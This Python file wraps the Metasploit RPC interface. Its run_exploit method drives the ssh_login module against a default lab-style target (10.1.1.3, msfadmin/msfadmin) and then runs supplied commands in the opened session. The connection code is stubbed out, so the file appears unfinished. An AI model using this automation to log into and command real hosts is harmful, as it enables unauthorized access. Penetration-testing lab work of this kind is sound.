import os
import time
import json
#from pymetasploit3.msfrpc import MsfRpcClient

class Metasploit:
    def __init__(self):
        self.name = "Metasploit API"
        print(f"Starting {self.name}")
        
        # Set up connection variables
        self.msf_server = os.getenv("MSF_HOST", "127.0.0.1")
        self.msf_port = int(os.getenv("MSF_PORT", 55553))
        self.msf_password = os.getenv("MSF_PASSWORD")
        
        # Attempt to connect to Metasploit server
        self.client = self._connect_to_msf()

    def _connect_to_msf(self):
        print(f"[-] Attempting to connect to MSF at {self.msf_server}:{self.msf_port}")
        while True:
            try:
                #client = MsfRpcClient(self.msf_password, server=self.msf_server, port=self.msf_port)
                print(f"[+] Successfully connected to MSF Server!")
                break # REMOVE THIS
                #return client
            except Exception as e:
                print(f"[!] Connection failed: {e}. Trying again...")
                time.sleep(1)

    def format_output(self, output):
        """Format the output with line breaks for readability."""
        return "\n".join(output.splitlines())

    def run_exploit(self, target_ip="10.1.1.3", username="msfadmin", password="msfadmin", commands=None):
        """
        Run SSH brute force and execute commands in the session.
        
        :param target_ip: Target IP for SSH brute-force attack
        :param username: SSH username
        :param password: SSH password
        :param commands: List of commands to execute in the session
        :return: JSON-like dict with status, session ID, and command output
        """
        if not commands:
            return {"status": "error", "message": "No commands provided"}

        try:
            # Set up and execute the auxiliary SSH brute-force module
            module = self.client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
            module['RHOSTS'] = target_ip
            module['USERNAME'] = username
            module['PASSWORD'] = password
            module.execute()
            time.sleep(3)  # Wait for the session to establish

            # Check for available sessions
            sessions = self.client.sessions.list
            if not sessions:
                return {"status": "error", "message": "No session established"}

            # Retrieve the latest session ID
            session_id = max(sessions.keys())
            session = self.client.sessions.session(session_id)

            # Execute each command in the session and capture output
            output = {}
            for cmd in commands:
                session.write(cmd)
                time.sleep(1)  # Adjust sleep time based on command requirements
                response = self.format_output(session.read())
                output[cmd] = response

            # Prepare JSON-like response
            return {
                "status": "Commands executed",
                "session_id": session_id,
                "output": output
            }

        except Exception as e:
            print(f"[Error] {e}")
            return {"status": "error", "message": str(e)}

# Example usage:
# msf = Metasploit()
# response = msf.run_exploit(commands=["uname -a", "id"])
# print(json.dumps(response, indent=4))